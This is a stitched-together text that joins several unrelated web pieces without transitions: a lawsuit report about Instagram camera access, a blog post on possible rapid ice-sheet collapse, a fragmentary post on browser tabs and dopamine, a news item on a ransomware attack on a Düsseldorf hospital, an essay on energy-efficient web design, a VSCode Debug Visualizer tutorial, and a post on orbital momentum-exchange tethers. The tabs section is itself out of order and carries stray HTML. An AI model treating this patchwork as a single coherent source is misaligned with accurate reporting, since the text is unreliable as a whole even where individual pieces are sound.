    Facebook Inc. is again being sued for allegedly spying on Instagram users, this time through the unauthorized use of their mobile phone cameras.The lawsuit springs from media reports in July that the photo-sharing app appeared to be accessing iPhone cameras even when they weren’t actively being used.Facebook denied the reports and blamed a bug, which it said it was correcting, for triggering what it described as false notifications that Instagram was accessing iPhone cameras.In the complaint filed Thursday in federal court in San Francisco, New Jersey Instagram user Brittany Conditi contends the app’s use of the camera is intentional and done for the purpose of collecting “lucrative and valuable data on its users that it would not otherwise have access to.”

        By “obtaining extremely private and intimate personal data on their users, including in the privacy of their own homes,” Instagram and Facebook are able to collect “valuable insights and market research,” according to the complaint.

        Facebook declined to comment.In a suit filed last month, Facebook was accused of using facial-recognition technology to illegally harvest the biometric data of its more than 100 million Instagram users. Facebook denied the claim and said that Instagram doesn’t use face recognition technology.The case is Conditi v. Instagram, LLC, 20-cv-06534, U.S. District Court, Northern District of California (San Francisco).(Updates with Facebook declining to comment.)

What you’re looking at is a geological formation called Dry Falls, in the Sun Lakes-Dry Falls state park in my home state of Washington. The Dry Falls are a series of escarpments and cliffs near Grand Coulee, deep in Eastern Washington’s channelled scablands region. These are four hundred foot high cliffs in the middle of the desert, how did they get here? What secrets does this terrain hold? What can the strange rock formations and alien landscapes of eastern Washington state tell us about the future of our planet?



During the end of the last ice age, a massive amount of glacial ice in continental Europe and North America melted away. During the period from 25,000 to 10,000 years ago, the Laurentide, Cordilleran, and Fennoscandian ice sheets completely melted, leading to a 120 meter rise in the global sea level. The rise in sea levels from this melting is estimated to have averaged in at roughly one meter per century while being augmented by two intense periods of melting between 15,000 and 13,000 years ago, and between 11,000 and 9,000 years ago.



While the current consensus among paleoclimatologists is that this melting was relatively gradual and steady, occurring at a linear rate over the course of 15,000 years, there is some evidence beginning to surface both in our current ice sheets and in the geologic records on the last one, that a gradual and linear melting rate is not what we should expect to see going forward. 



In this post, I’ll look at recent melting trends in Antarctica and Greenland as well as at paleoclimate data from ice and seabed cores to propose a model of continental ice sheet collapses as rapid and potentially cataclysmic historical events which we should be aware of as potentially civilization destabilizing. Most of our current population, our largest cities, and most of our power and industry facilities, are all located in low lying areas susceptible to coastal flooding. If the water levels rise at a rate faster than can be mitigated by a slow withdrawal from the coastline over the course of many decades and centuries, it could cripple human civilization and bring an end to our current way of life. 



The first piece of evidence to note here is that the geologic record of the last ice age is littered with superfloods and seemingly cataclysmic sea level rise events. Water topped over earthen berms and flooded into lowlying areas, Doggerland and Sundaland vanished beneath the waves and the Bering Strait cut Asia and North America apart. These events have left scars on the surface of the Earth which you can see from space, you just need to know what to look for. 



This is the North Fork of the Toutle River as it flows across the soft dried mud and ash of the Mount Saint Helens lahar zone, I provide this image just to given an example of stream braiding, the lahar zone gives a nice canvas on which you can really see how the water carves all these winding channels through the surface material. This happens in rivers around the world though, there are dozens of examples of this sort of river braiding I could show you. The important thing to note here though is the scale of this landform. The lahar zone is less than a kilometer across, and we can see roads and trees and houses at this level of zoom. 



So now lets zoom out and look east across the Cascade range. 



This is the channelled scablands from far above. At the height which satellites orbit, the mass scouring of hundreds of square kilometers can clearly be seen. braids tens of kilometers across and hundreds of kilometers long draw tracks across all of eastern Washington before spilling into the Columbia River Valley to flow onward toward the Pacific. This event, or events, geologists aren’t sure, is referred to as the Missoula Megafloods, and was the source of the Dry Falls pictured at the beginning of this post. At their peak flow, the Dry Falls were twice the height of Niagara Falls and five times the width. So much water poured into the Columbia River that it backfilled and flooded most of the Willamette Valley.



According to current consensus, these massive floods were caused when a proglacial lake formed in what is now Missoula, Montana. The leading theory is that a fifty mile long ice dam formed across the Clark Fork River which caused the waters of the receding Cordilleran Ice sheet to back up and pool around Missoula. This presents the first problem with the current consensus and is where a rather peculiar group of individuals become involved. 



There are a group of slightly kooky geologists and historians who call themselves the Catastrophists. They hold that a moderately advanced civilization in North America was destroyed during the Younger Dryas period around 12,000 years ago and have found all sorts of interesting things to lend credence to their theory. 



The Catastrophists looked at the story of the Missoula Megafloods and said, “That doesn’t work.” They pointed out that an ice dam the size of the one proposed cannot possibly have held back the amount of water under the head pressure that Glacial Lake Missoula was under, long enough for the lake to each its maximum historical depth of over 600 meters. Glacial Lake Missoula is estimated at having held 2,500 cubic kilometers of water, and the catastrophists say that there’s no way that could have happened with an ice dam triggered outburst flood, the ice would give before that much water could build up.



Instead, the Catastrophists propose that glacial lake missoula wasn’t a long term lake, but formed temporarily as a result of water flowing in from further north pooling and backfilling around Missoula as it interacted with the chokepoint in its flow along the Clark Fork River Valley. 



The Catastrophists also have other evidence of rapid melting which they have found from seabed cores. Most of the seabed is composed mostly of decaying organic material, crushed up tiny organisms that rain down to the bottom in an ever present snow. However, there are notable strata lines within seabed cores, which contain mostly rocks, pebbles, sand, and other inorganic debris. These layers are called Heinrich Events, and it is believed that they are caused by large masses of icebergs breaking off, carrying rocks and sediment with them, and then dropping these bits of rock and sediment as they melt away. All of these things come together, according to the catastrophists, to seemingly support their theory of a cataclysmic event during the Younger Dryas period, 12,900 years ago. 



So the Catastrophists look at all the data for speed of melting, heating from sunlight, atmospheric C02 levels, and conclude that the melting just happens too fast to be explained without an outside source. They claim there simply wasn’t enough energy available for the math to work out unless you added a bunch of extra energy from somewhere outside the climactic system. 



The solution to this problem, they say, is that around 12,900 years ago, a comet or asteroid struck the top of the Laurentide Ice Sheet, triggering a massive pulse in melting which we observe in the form of megafloods and Meltwater Pulses and Heinrich Events. The evidence for this is shaky, but I sincerely hope they end up being correct. And they might actually be, late last year a 19 kilometer wide impact crater was discovered under the Hiawatha Glacier in Greenland. This impactor, if it occured at the right time period, might actually be the catastrophists smoking gun. 



However, I am not particularly confident that they are correct. Because it’s under a glacier, we don’t yet know how old the crater at Hiawatha actually is. It could be significantly older than 12,000 years, and if it is, than we’re once again left with too much melting to fit our model and no discernible cause. The currently dominant theory is that a combination of increased insolation on the glaciers and high C02 levels at the time caused their final retreat and collapse. However, the effect seems to have exceeded the cause and the extremity of the events, especially the large pulses of meltwater, seem to imply some other mechanism was present. 



Without invoking some outside event like a volcanic eruption or an extraterrestrial impact, the only explanation we’re left with is the ill-understood climate feedback mechanisms which we are currently engaged in setting off en-masse.



The impact theory is in some senses comforting. We have big telescopes, we can see into space now, in theory, if we knew an impact event was coming, we could prevent it. If it takes an impact to cause a catastrophic melting and sea level rise event, then we’re mostly safe from it happening. If the melting was caused by an impact, then it means our current climate models which estimate around a meter of sea level rise by the year 2100, are largely accurate. 



But if these melting spikes were not caused by an impact, then it means something on earth which we currently do not understand triggered them. Something caused the ice sheets to suddenly and rapidly destabilize and release a large quantity of meltwater over a relatively brief period. If such an event were to occur today, the effects would be globally catastrophic. If an event caused a one-meter sea level rise over the course of a few years, it would render many of the world’s coastal cities uninhabitable. 



Scientists have posited that the West Antarctic Ice sheet, which is sitting on bedrock below sea level, could potentially experience a catastrophic collapse event if sea water was able to access the roots of this glacier. Although computer models have been unable to construct the timeline of events in detail, the possibility remains that the entire ice sheet could collapse over a period as short as a few years, which, if the entire thing went, would lead to 6 to 9 meters of sea level rise, enough to submerge a large number of urban cores around the world and utterly remake coastlines. 



The possibility of this catastrophic melting event is often left out of the climate change conversation, with the assumption being that melting will be a nuisance and force the eventual abandonment of low-lying areas or construction of new seawalls, but is not an existential threat to civilization by itself.



If the entire West Antarctic ice sheet was to collapse over a five year period, it would lead to a global crisis as populations were forced to relocate and cities were rendered unlivable. In many ways, the predictions that the ice sheets will last for centuries more and take a thousand years to melt away are overly optimistic and based on older and less accurate models of past climate events. A recent paper has provided evidence that melting may not be linear in nature but exponential, and if recent trends in accelerating melting are extrapolated out, we could see multimeter sea level rise within the next fifty years.



This would not by itself be an X-Risk, but would represent a major case of cranking up the pressure that humanity is put under, and make other X-Risks such as nuclear wars and pandemics more likely. It is my opinion that the possibility of catastrophic ice sheet collapse should be carefully considered and studied as a real possibility. It’s unlikely we could prevent such a collapse from occurring, but by anticipating such an event we may be able to save many lives and livelihoods.

        Many people I know have dozens of windows like this. Tabs so small they can't even see the full title. Keeping these tabs open is a form of externalized working memory. Jumping back in should feel akin to the last time a user was immersed in that window. At some point though, the number of tabs begins to toe the line between externalized memory and information hoarding. The desire to keep tabs open for too long with no end-state is similar to physical hoarding.  I know there are some solutions that ""save"" tabs. These extensions are designed to snapshot a window and store it. I’ve used these before and find them useful although they still feel very unorganized and stiff. There’s also a significant amount of cognitive load to readjust to all of the information. These solutions address the problem directly but the tab issue is a manifestation of a more “core” issue around organizing goal-driven information consumption. Unpacking the relationship between tabs and cognition may be a step in the right direction. The tab is also just a wrapper around what’s really important: the content inside it. Maybe it’s a paragraph, a piece of code, or a video vs. everything else that comes with the site. Part of the solution here is rethinking the way we organize the information that we think is relevant on a given site. The Seeking CircuitAt the cellular level, this type of behavior is heavily influenced by the seeking circuit in the brain. In some sense, the brain is a collection of different neural circuits executing some desired function. Two of the most prominent circuits are the seeking circuit and the reward circuit [1].  The seeking circuit is on the constant look out for any type of reward. It’s what makes us curious about a new idea and drives us to search for it. Once a the seeking circuit finds something that’s rewarding, the reward circuit is activated. Interestingly enough, the seeking and reward circuits also act on information. The acquisition of information generates reward [2].  Looking for information on the internet activates this circuitry and may be part of the reason why we accumulate so many tabs. As the seeking circuitry seeks, tabs accumulate. An even more important note is the dominance of the seeking circuitry over the reward circuitry [3]. Just because I received a reward doesn’t blunt the desire to continue seeking. The desire to seek for goal-oriented information is also linked to these circuits. Goal-oriented behavior is mediated by dopamine, a critical neurotransmitter in these circuits [3]. It’s incredibly easy to find some information on the internet (regardless of quality). Because of this fast feedback loop, looking for information is a quick and easy way to hijack the reward pathway.Sources[1]: https://www.jimhopper.com/topics/brain-healing-and-happiness/key-brain-circuitries/#seeking-circuitry[2]: https://www.semanticscholar.org/paper/Valuation-of-knowledge-and-ignorance-in-mesolimbic-Charpentier-Bromberg-Martin/130eeb14b2dc857a0aec8beafb05f6b8a6ebe079[3]: http://thebrain.mcgill.ca/flash/capsules/pdf_articles/dopamine.pdfThis was a quick one but something I’ve been noodling on for a couple weeks.

It houses relevant tabs towards a goal. There are edge cases but when I find myself with dozens of tabs, they usually have some common thread. </p><p>Tabs and windows are functions of our internal cognition. As I find new information, I ask more questions creating more tabs.

  A woman in Germany died during a ransomware attack on the Duesseldorf University Hospital, in what may be the first death directly linked to a cyberattack on a hospital. The hospital couldn’t accept emergency patients because of the attack, and the woman was sent to a health care facility around 20 miles away, the Associated Press reported. 
The cyberattack was not intended for the hospital, according to a report from the German news outlet RTL. The ransom note was addressed to a nearby university. The attackers stopped the attack after authorities told them it had actually shut down a hospital.

Health care facilities are one of the biggest targets for cyberattacks, and cybersecurity experts have warned for years that most hospitals aren’t prepared. They rely heavily on devices, like radiology equipment, that are often connected to the internet. Without those tools, they aren’t as able to treat patients. 
“If systems are disrupted over the internet, by an adversary or an accident, that can have a profound impact on patient care,” says Beau Woods, a cybersecurity advocate and cybersafety innovation fellow with the Atlantic Council, told The Verge last year. 
Even attacks that target patient data, and don’t directly impact medical devices, can hurt patient outcomes: one study found that a hospital’s death rate from heart attacks goes up in the years after a data breach. That’s probably because hospitals have to divert resources to respond to the attack or upgrade software in a way that changes how doctors operate. 
Major cyberattacks, like the 2017 WannaCry cyberattack, have shut down major hospital systems — WannaCry took down the United Kingdom’s National Health Service, for example. No deaths were directly linked to that attack, but most experts warned it was only a matter of time.

German authorities are still investigating this woman’s death. If her diversion to another hospital is found to be responsible for her death, police may treat the cyberattack as a homicide.

        Web Design and Carbon Impact

How can we, as web professionals, help to make the web more energy efficient?

From data centres to transmission networks to the devices that we hold in our hands, it is all consuming electricity, and in turn producing carbon emissions. According to recent estimates, the entire network already consumes 10% of global electricity production, with data traffic doubling roughly every two years. It’s probably something very few people think about, or are even aware of as being an issue. But the fact of the matter is that the Internet consumes a huge amount of electricity. And when it comes to web design, there is a lot that can be done to make the web far more energy efficient.
Attitudes
Creating a website is a lot more accessible today, made simpler by the emergence of no-code site builders. But it might be asking a lot for your typical web user or amateur creator to be aware of the environmental impact of their site. This, however, shouldn’t really be the case for any digital professional. Naturally, web developers will be more conscious of the weight of their pages, given that they are fully immersed in the code and content management that serves what you see on a web page. But even then, many developers simply look for the quickest route to completing a project, rather than the best way to produce the quickest and most efficient site. 
So they load a website with bulky Javascript and third-party tools to meet the visual specification of the client or designer. As long as it works, right? They probably don’t care. They’re probably happy with their site that loads quickly on their 500Mbps connection. Who cares if they’re wasting expensive data on mobile connections in other countries? “But Carl, some of us don’t have the luxury of building super high-performance, lightweight, and optimised sites due to client budgets and deadlines.” Well, I think you need to work on your craft, change your attitude and your priorities, or find another profession.
When we talk about the energy efficiency of websites, it’s easy to assume that it’s a purely technical topic. However, efficiency can be improved before we even build a website. Design and content have a big impact on energy efficiency.
Therefore, some of the biggest contributors to heavy sites and large CO2 emissions, are designers. Large moving imagery, multiple web fonts, animation, sound, autoplaying video, and generally esoteric design is prevalent these days. We see showcase after showcase of the best of the web, where the only criteria is: “Does it look well-designed?” Well, look under the hood. It’s pretty terrifying. And that’s not even getting into the many accessibility concerns. If only more designers would ask themselves, “When was the last time I considered page size when designing something? When was the last time I decided that page weight was more important than aesthetics?” 
These are questions I have put to designers before, and the response quite often is, “I’m just experimenting with technologies and trying to improve my UI skills. What harm is there in that?” Well, Site of the Day, the harm is your energy usage, and the likelihood that nobody—besides an echo chamber of fellow designers—give a shit about your over-design. People just want to access content quickly, without distraction, without friction, and without it using a tonne of data. That’s not to say aesthetics aren’t important—they certainly are. The visual design of a site can play a significant role in user experience, readability, and conversion, but as with most things, there is a balance to be achieved. And there is a responsibility to be shared.
Solutions
Fortunately, there are a growing number of web professionals who do care about the impact sites have on the planet, and there are many solutions designers and developers alike can find to improve their sites without overly compromising their designs. Solutions that I am actively looking into to improve my own work.
So how can we be more energy efficient in web design? Well, the folks over at Wholegrain Digital put together a comprehensive list, but here are some key considerations:
Reduce Images
The single largest contributors to page weight. The more images, the more data needs to be transferred and the more energy is used. A good starting point is to ask oneself:
Does the image genuinely add value to the user?
Does it communicate useful information?
Could the same impact be achieved if the image was smaller?
Could we achieve the same effect with a vector graphic (or even CSS style) instead of a photo?
Optimise Images
Some designs are focused almost entirely on imagery, in which case optimisation is vital to better performance. There are technical decisions that significantly affect the file size of images displayed on a page. These include:
Load images at the correct scale instead of relying on CSS to resize them, so that you avoid loading images that are larger than the scale they will be displayed at.
Use image optimisation tools before you upload them to your site. I personally use ImageOptim.
Use the most efficient file format for each image, such as WebP instead of JPEG (although this is not supported by all browsers).
Use image processing tools to resize, crop, and enhance your images that are served. I use imgimx for this, which works well for image-heavy sites such as Minimalissimo.
Reduce Video
By far the most data intensive and processing intensive form of content. As with images, ask yourself if videos are really necessary. If they are, never autoplay a video. It creates a much higher load on the users CPU, resulting in vastly greater energy consumption. Plus, it’s annoying as hell. Let the user decide whether or not to play a video.
Font Selection and Optimisation
Web fonts can enhance the visual appeal of site designs, as well as improve readability, but they can add significant file weight to the sites on which they are used. A single font file could be as much as 250Kb, and that might only be for the standard weight. If you want bold, add another 250Kb! A couple of options worth considering:
Use system fonts where possible.
Use fewer font variations.
Stick to modern web font file formats like WOFF and WOFF2.
Subset fonts to only include the characters needed on the site.
Write Clean Code
Tidy and streamlined code is a fundamentally good thing. Keep code clean and simple, avoid duplication, and write efficient queries. The code behind the scenes should be a well oiled, lean machine. And I’ll take this opportunity to share a controversial opinion: all designers should learn to code. At least if they want a website. No-code site builders can be very good, but if you’re not aware of the underlying code, then you’ll be less aware of ways to optimise your site.
Use Less Javascript
JS impacts website efficiency in two ways: by adding file weight to the web page and by increasing the amount of processing required by the user’s device. The second of these is something that applies to JS much more than to other types of files. Look for ways to achieve front-end interactions, functionality, and animations using more efficient technologies like CSS, or at least use JS efficiently. A particular mention should be given here to tracking and advertising scripts that rarely offer any value to the user, but can add significant file weight. Don’t let advertising get in the way of craftsmanship.
Use Server Caching
Using caching technologies such as Memcached or Varnish pre-generate static versions of each page so that the server overhead can be significantly reduced for most visitors. This significantly reduces server energy consumption and makes a big difference to page load times. 
SEO
When optimising a site for search engines, we are helping people find the information they want quickly and easily. When SEO is successful, it results in people spending less time browsing the web looking for information, and visiting fewer pages that don’t meet their needs.
No site is perfect, but appreciating that we have a responsibility to produce better digital design for the planet and for users is a good place to start. Web efficiency is an attitude and the result of a mindful approach to building for the web.

Visualize Data Structures in VSCode
        September 17, 2020
    VSCode Debug Visualizer is a VSCode extension that allows you to visualize data structures in your editor. This can be useful for visualizing watched values during debugging. I've found the extension can be helpful to visualize plots, tables, arrays, histograms and trees.


  @media only screen and (max-width: 640px) {
    #post-body img { height: 50%; }
    #post-body video { height: 50%; width: 100%; }
  }
Once the extension is installed, open some relevant scripts then navigate to the command palette and go to Debug Visualizer: New View. This view allows you to enter expressions that are visualized while stepping through your code. It's very similar to VS Code's watch view, with the core difference being that results are visualized rather than displayed in a text format.

If you have a selection of text you want to visualize, Debug Visualizer: Use Selection as Expression can evaluate the current text you have selected in the last debug visualizer window you opened.

Official examples

The JavaScript examples for VSCode Debug Visualizer are included in the main repository. To get started with them, check you have yarn and node installed, then:

Clone the repository locally. Navigate to the demos/js directory once that's done.
Run yarn to install the dependencies. I needed to manually run yarn add @hediet/debug-visualizer-data-extraction to get everything working. 
Open the repo up in VSCode and select an example. e.g demo_doubly-linked-list.ts
Add a breakpoint / debugger statement somewhere in the source (e.g line 50). 



Go to Run > Start Debugging and select an environment (e.g Node.js (preview)).



From the command-palette, select Debug Visualizer: New View. 



You should now be able to enter visualize() into the prompt and see a plot visualization in your editor for the doubly linked list:



Try your own examples

Before trying the extension on your own examples, note that expressions you wish to visualize must both evaluate to a JSON Object string and match the schema of one of the extension's supported visualizers (outside of simple data types, like arrays). In the examples below, note the ""kind"": { ""graph"": true }, ""kind"": { ""plotly"": true } etc. entries which are a part of this schema. 

Below you can find some of the code snippets I used when testing out the extension.

Arrays
const range = [1, 2, 33, 31, 1, 2, 63, 943, 346, 24, 123, 6, 32];



Dynamic data from a REST API

Data that is visualized doesn't need to be static. As demonstrated in the fetch() example below, it can also come from a REST API.

const fetch = require('node-fetch');

fetch('https://jsonplaceholder.typicode.com/users')
   .then((response) => response.json())
   .then((json) => {
       debugger;
   });

Graphs
const example1 = {
    ""kind"": { ""graph"": true },
    ""nodes"": [
        { ""id"": ""1"", ""label"": ""1"" },
        { ""id"": ""2"", ""label"": ""2"", ""color"": ""orange"" },
        { ""id"": ""3"", ""label"": ""3"" }
    ],
    ""edges"": [
        { ""from"": ""1"", ""to"": ""2"", ""color"": ""red"" },
        { ""from"": ""1"", ""to"": ""3"" }
    ]
};



Tables
const table = {
    ""kind"": { ""table"": true },
    ""rows"": [
        { ""userId"": 1, ""country"": ""us"", ""amount"": 2 },
        { ""userId"": 2, ""country"": ""ie"", ""amount"": 1 },
        { ""userId"": 2, ""country"": ""de"", ""amount"": 1 },
        { ""userId"": 1, ""country"": ""us"" }
    ]
};



Plotly graphs

""kind"": { ""plotly"": true } allows you to leverage the Plotly graphing and data-science library for visualizations.
const example2 = {
    ""kind"": {
        ""plotly"": true
    },
    ""data"": [{
            ""y"": [67, 58, 62, 65, 72],
            ""name"": ""Production""
        },
        {
            ""y"": [69, 55, 67, 68, 73],
            ""name"": ""Staging""
        }
    ]
};



Plotly histograms
function computeHistogram() {
    const x1 = [];
    const x2 = [];
    const y1 = [];
    const y2 = [];
    let k = 0;
    for (let i = 1; i < 500; i++) {
        k = Math.random();
        x1.push(k * 5);
        x2.push(k * 10);
        y1.push(k);
        y2.push(k * 2);
    }
    const trace1 = {
        x: x1,
        y: y1,
        name: 'control',
        autobinx: false,
        histnorm: ""count"",
        marker: {
            color: ""rgba(255, 100, 102, 0.7)"",
            line: {
                color: ""rgba(255, 100, 102, 1)"",
                width: 1
            }
        },
        opacity: 0.5,
        type: ""histogram"",
        xbins: {
            end: 2.8,
            size: 0.06,
            start: .5
        }
    };
    const trace2 = {
        x: x2,
        y: y2,
        autobinx: false,
        marker: {
            color: ""rgba(100, 200, 102, 0.7)"",
            line: {
                color: ""rgba(100, 200, 102, 1)"",
                width: 1
            }
        },
        name: ""experimental"",
        opacity: 0.75,
        type: ""histogram"",
        xbins: {
            end: 4,
            size: 0.06,
            start: -3.2

        }
    };
    return {
        ""kind"": {
            ""plotly"": true
        },
        ""data"": [trace1, trace2],
        ""layout"": {
            bargap: 0.05,
            bargroupgap: 0.2,
            barmode: ""overlay"",
            title: ""Sampled Results"",
            xaxis: {
                title: ""Value""
            },
            yaxis: {
                title: ""Count""
            }
        }
    };
}
let example3 = computeHistogram();



Plotly 3D-mesh graphs
// Generate random data
let a = [];
let b = [];
let c = [];
let a_ = 0;
let b_ = 0;
let c_ = 0;
for (let i = 0; i < 50; i++) {
    a_ = Math.random();
    a.push(a_);

    b_ = Math.random();
    b.push(b_);

    c_ = Math.random();
    c.push(c_);
}
// Plot the mesh
const example4 = {
    ""kind"": {
        ""plotly"": true
    },
    ""data"": [{
        opacity: 0.8,
        color: 'rgb(300,100,200)',
        type: 'mesh3d',
        x: a,
        y: b,
        z: c,
    }]
};



Plotly pie-charts
const example5 = {
    ""kind"": {
        ""plotly"": true
    },
    ""data"": {
        values: [19, 26, 55],
        labels: ['Work', 'Gym', 'Rest'],
        type: 'pie'
    },
    ""layout"": {
        height: 400,
        width: 400
    }
};

Space Tethers: Stringing up the Solar System





All the methods we have used to reach space so far have been subject to the Tsiolkovsky rocket equation - propellant must be ejected and more and more of it is needed to go further.What if we could break that equation with rotating orbital tethers?The tetherI have worked with Kurzgesagt to write the following video on the topic of this post: https://www.youtube.com/watch?v=dqwpQarrDwk.It is highly recommended that you have watched it first before continuing, as it is an excellent introduction and explanation of momentum exchange tethers.  Top post art is by Jullius Granada.The simple description is that a rotating tether, consisting of a strong cable with an attachment point at the tip and an anchoring counterweight at the center, will be able to catch and throw payloads without requiring a rocket engine. The process of hooking onto a payload to accelerate it into a new trajectory will transfer momentum from the counterweight to the payload, causing the tether to slow down. In reverse, a payload can be caught and slowed down, transferring momentum back into the counterweight and speeding it up. The ability to transfer momentum back and forth is why these structures are also called momentum exchange tethers. NASA has long studied this option.In this post, we will go into more detail on what is needed to create a functional rotating tether, how it can be used and what its potential effects are on space travel and industry could be. The mechanicsUsing a tether to move from one orbit to another, in this case LEO to GEO.The idea to use a long tether to climb into space without expelling propellant is an old idea. A huge tower extending up past the atmosphere was described by Tsiolkovsky. It is ironic that the person who first described how hard spaceflight by rocket is, due to the exponential nature of the deltaV equation, is also the person who described the best way to side-step that problem with non-rocket launch. The material requirements for a full space elevator are extreme. The only practical way to build it would be to use carbon nanomaterials, but extended to a scale of multiple kilometres instead of the micrometres we struggle to produce consistently in a laboratory today. It is why we must turn to something that provides some of the same benefits without the same stringent requirements.For this, there is the orbital tether concept. A large object in orbit, such as a satellite, space station, captured asteroid or similar, can serve as an anchor point to extend a strong cable down to a lower altitude. A payload can grab onto the lower end of the cable and climb up to the altitude of the anchor point. This climb does not require the use of propellant. The simplest design is a stationary orbiting elevator that provides a deltaV benefit based on the difference in orbital velocities at high and low altitudes.An LEO to GEO elevator.In the example above, an space station orbits at 2,000 km altitude, at an orbital velocity of 6.89 km/s. It performs one orbit in about 2 hours and 7 minutes. The lower tip extends down to an altitude of 200 km. It retains its orbital period but the distance it travels is much less, so velocity is reduced to 5.41 km/s. A circular orbit here is 7.78 km/s, so it provides a 2.37 km/s saving. The upper tip reaches up to 3,860 km altitude. It covers much more distance with the same orbital period, so velocity increases to 8.43 km/s, compared to the 6.24 km/s of everything else orbiting at that altitude. It is a 2.19 km/s boost. In total, we get a 4.56 km/s benefit.  Huge altitude differences are needed to create the potential for significant deltaV savings. Because the lower tip of the tether is travelling at orbital velocity, it cannot extend too far down either; as it would encounter the atmosphere and burn up.A tether boost facility designed to be launched from a DeltaIV.A rotating tether does away with those limitations. The velocity of its tips and the speeds at which it can capture or release payloads can vary greatly from the orbital velocity of the anchor point. It can be much shorter too.At its lowest point, the tip of a rotating tether will be travelling at orbital velocity minus the rotation velocity. At its highest point, the two velocities will add up. The length of the tether itself will place the tips at very different altitudes at their highest and lowest points. Moving a payload between these altitudes is an additional benefit.Let’s imagine a modestly-sized tether orbiting at a high altitude above the Earth. It is 1,000 km long, orbiting at 1,100 km altitude and rotating once every 70 minutes. Its lowest point is 100 km above the surface of the Earth. Its highest point extends to an altitude of 2,100 km. Tip velocity is 1.5 km/s. It is tapered from base to tip to minimize its mass.Tapered tethers are the lightest design.Orbital velocity at 1,100 km is 7.3 km/s. At its lowest point, the tether tip will be travelling at 5.8 km/s relative to the ground. At its highest point, this value becomes 8.8 km/s. If a suborbital craft launched from the ground to try to catch up with the tip at its lowest and slowest, it would need to expend a deltaV of about 6.8 km/s. It can then quickly transfer a payload onto the tether. The payload then starts its 35 minute journey up around to the opposite end of the tether. It experiences an average acceleration of 0.23 g while doing so.At the top of the tether, it is released into a trajectory that forms an ellipse with its periapsis at 2,100 km altitude and its apoapsis at 13,500 km. It can then expend an additional 1.4 km/s of deltaV to reach the Moon, or about 1.6 km/s to escape the Earth entirely.If a typical 350s Isp kerosene-oxygen rocket is used, then it needs a total deltaV of about 8.2 km/s to ride the tether to the Moon. Meaning, it has an overall mass ratio of 10.9. However, if there is no tether available, then the deltaV requirement rises to 12.5 km/s and the mass ratio required balloons to 38! The tether is effectively saving 4.3 km/s of deltaV and leading to a much smaller rocket.The tether can also help with returning from the Moon. The spacecraft swoops down from lunar altitude (384,400 km) to a rendezvous with the tether at 2,100 km altitude. It would be travelling at 9.6 km/s, so it needs to spend an additional 0.8 km/s of deltaV to slow down enough to match the 8.8 km/s velocity of the tether's upper tip. In return, it avoids having to slam into the atmosphere and instead is swung down for much gentler aerobraking. The weight savings from having a thinner heatshield could more than make up for the propellant consumed, especially if this is a reusable vessel. Note that tethers do not have a single velocity for catching and releasing payloads. It is in fact a range of velocities, from zero up to the tip velocity. For capture at lower velocities, a payload can aim to intercept the tether at a point closer to the base of the tether. Halfway up the tether means a redezvous at half the tip velocity. The same goes for release; not releasing from the tether tip means a lower velocity. You can imagine a vehicle launching up from the ground to catch the tether tip at its lowest point, and instead of swinging around to the other side, just slowly climbing up the tether until it can hop off from the anchor station. This puts it in an orbit parallel to the anchor station, which is great if you are not trying to fly off to the Moon or beyond. However, making use of this flexibility means adding a way to prevent the unused length of the tether from striking the payloads coming in for a rendezvous, as well as providing structures that allow payloads to climb up and down the tether (although they can be as simple as a pulley and cables). The ISS regularly is regularly reboosted against the effects of drag.And of course, none of these deltaV savings are for ‘free’. Accelerating payloads means the tether will slow down. If it slows down too much, it will de-orbit itself. The momentum lost with each catch-and-release operation must be recovered either by absorbing momentum from payloads being slowed down, or by using its own propulsion system.A major advantage of an orbital tether is that you do not have to immediately recover that momentum - it gives time for slower but more efficient propulsion systems like a solar-electric thruster to gradually accelerate the tether. A chemical propulsion system limited to 450s of Isp is not needed as the acceleration can be done over time with something that has thousands of seconds of Isp. The propellant needed to run the tether’s engines is greatly reduced. Even more interesting is the possibility of propellantless propulsion, such as electrodynamic tethers that push off the magnetic fields around a planet. Electrodynamic tether reboost.Another advantage is that the tether can ‘store’ excess momentum. It can accelerate itself to a more energetic orbit with a higher velocity. For example, a tether in a 2,000x2,000 km circular orbit could accelerate by 1 km/s to reach a 2,000x9,565 km orbit. It can still capture payloads at the same 2,000 km altitude, but it will have an additional 1 km/s of velocity to use. The extra velocity can be used to accelerate the same payloads faster, more numerous payloads to the same speeds or larger payloads than possible before. Tether masses and velocitiesTether structure and materials for the early TSS-1 experiment in orbit.The tether materials determine how fast the tips can rotate. Each material has a certain characteristic velocity, given by:Characteristic velocity = (2 * Tensile Strength / Density)^0.5Characteristic velocity is in metres per second.Tensile Strength is in Pascals.Density is in kg/m^3.Steel is strong, with a maximal strength of 2,160 MPa for AerMet 340, but dense, at 7,860 kg/m^3. This gives it a characteristic velocity of 741 m/s.The aramid fiber Kevlar is stronger and lighter, managing 3,620 MPa with 1,440 kg/m^3. Its characteristic velocity is 2242 m/s.The strongest material we can mass-produce today is Toray’s polyacrylonitrile fiber T1100G. It can resist 7,000 MPa while having a density of 1,790 kg/m^3, so its characteristic velocity is 2,796 m/s. If we can describe the tip velocity as a multiple of the characteristic velocity, then we can use a much simpler equation to work out how much a tether will mass. We’ll call this the Velocity Ratio or VR.For example, 1.5 km/s is a VR of 2.02 for steel but only a VR of 0.54 for T1100G. The tether mass will be directly proportional to the payload mass. If it has to pull up a 1 ton payload, it will be ten times heavier than if it only needs to pull on 100 kg payloads. Using the VR, we can calculate the tether mass ratio using this equation:Tether Mass Ratio = 1.772 * VR * e^(VR^2)Tether Mass Ratio is a multiple of the payload mass, in kg.VR is the Velocity Ratio.Using the previous example, a 1.5 km/s steel tether will have to be 211.8 times heavier than its payload. A T1100G tether would only be 1.28 times heavier than its payload. This is a significant difference. The e^(VR^2) portion of the tether mass equation highlights just how important it is to use strong yet lightweight materials and to keep the tip velocity close to the characteristic velocity.Here is a graph showing how tether mass increases with the Velocity Ratio for different materials:It should be noted that all of these calculations are for a tether with no safety margins. Any sort of variation, such as vibrations from the counterweight or an imperfect capture of the payload, would snap it. A minimal safety margin might be 50%. Crewed spacecraft might demand a 200% margin or more. What this means in practice is that the maximum payload the tether could handle is reduced to create a safety margin.To overcome the limitations of the tether tip velocities, the tether can move into higher energy orbits. For example, a tether with a 1.5 km/s tip speed starts off in a circular 2000 km altitude orbit moves itself into a 2,000x1,000,000 km orbit. It can still capture payloads at the same altitude but it now does so at a velocity of 9,391 m/s instead of 6,897 m/s. This gives it 36% more momentum to give, and it can release payloads at a velocity of up to 10,891 m/s relative to the Earth. This is beyond the escape velocity at that altitude! If the tether had stuck to its initial 2000km circular orbit, its tip speed would have had to be 4 km/s instead, which would have meant an exponentially higher mass ratio. 